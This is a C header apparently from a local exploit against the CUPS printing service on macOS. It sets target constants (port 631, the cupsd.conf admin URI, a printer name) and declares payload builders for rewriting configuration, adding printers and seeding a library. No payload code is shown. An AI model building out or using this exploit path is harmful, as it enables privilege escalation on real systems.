#ifndef __HTTP_H
#define __HTTP_H

#include "membuf.h"
#include "exp.h"
#include "loader.h"

#define FILENAME_SIZE 0x1000

enum {
  METHOD_INVALID,
  METHOD_GET,
  METHOD_POST,
  METHOD_HEAD,
  METHOD_PUT
};

#define AUTH_URI "/index.htm"
#define EXP_PORT 631
#define EXP_HOST "localhost"
#define EXP_URI "/printers"
#define EXP_PRINTER "Photosmart_Premium_C309g_m"
#define EXP_METHOD METHOD_POST
#define EXP_CONFIG_URI "/admin/conf/cupsd.conf"
#define EXP_CGI_URI "/help"
#define EXP_CONFIG_METHOD METHOD_PUT
#define EXP_NUM_TEMP_FILES 256
#define EXP_OS OS_MACOS
#define EXP_ARCH ARCH_UNIVERSAL

typedef struct uritest {
  int method;
  char *uribase;
  int exp_resp;
} uritest;

int parse_resp_code(mem_buf *b);
int get_line_length(char* line, size_t len);
int skip_response_headers(mem_buf* b, size_t* content_length_out);
int parse_response(expctx* ctx, uritest* uri, mem_buf* b, int type);
mem_buf *build_exploit_payload(expctx* ctx, uritest* uri, int ipp_type);
mem_buf *build_exploit_payload_newconfig(expctx* ctx, uritest* uri);
mem_buf *build_exploit_payload_getprinter(expctx* ctx, uritest* uri);
mem_buf *build_exploit_payload_adminconf(expctx* ctx, uritest* uri);
mem_buf *build_exploit_payload_admin(expctx* ctx, uritest* uri);
mem_buf *build_exploit_payload_addprinter(expctx* ctx, uritest* uri);
mem_buf *build_exploit_payload_seed_library(expctx* ctx, uritest* uri);
mem_buf *build_exploit_payload_generic(expctx* ctx, uritest* uri);

char *get_method_string(int method);

#endif
